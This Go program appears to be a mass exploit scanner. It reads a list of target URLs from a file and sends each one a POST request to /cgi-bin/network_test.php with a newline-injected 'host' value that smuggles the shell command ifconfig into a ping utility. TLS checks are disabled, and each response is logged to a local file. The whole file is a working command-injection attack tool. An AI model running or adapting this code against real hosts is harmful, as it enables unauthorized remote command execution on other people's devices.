package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

func main() {
	url := list("url.txt")
	fmt.Println(url)
	for _, u := range url {
		fmt.Println("开始扫描:" + u)
		startscan(u)
	}

}

func startscan(url string) {
	var req *http.Request
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	post := "host=%0aifconfig%0a&command=ping"
	req, _ = http.NewRequest("POST", url+"/cgi-bin/network_test.php", strings.NewReader(post))
	req.Header.Set("Host", "localhost")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36")
	req.Header.Set("Accept-Encoding", "gzip")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Connection", "close")

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println(url + "-- request fail")
		return
	}
	defer resp.Body.Close()

	ok, _ := os.OpenFile("tosei.txt", os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0600)
	defer ok.Close()
	body, _ := ioutil.ReadAll(resp.Body)

	str := string(body)
	fmt.Println(str)
	ok.Write([]byte(url + "\r\n" + str + "\r\n" + "============================================================="))

}

func list(urlfile string) []string {
	var url_list []string
	url_file, err := os.Open(urlfile)
	if err != nil {
		fmt.Println("Can't open urlfile")
	}
	defer url_file.Close()
	reader_Url := bufio.NewReader(url_file)
	for {
		url, err := reader_Url.ReadString('\n')
		url = strings.Replace(url, " ", "", -1)
		url = strings.Replace(url, "\n", "", -1)
		url = strings.Replace(url, "\r", "", -1)
		url_list = append(url_list, url)
		if err == io.EOF {
			break
		}
	}
	return url_list
}
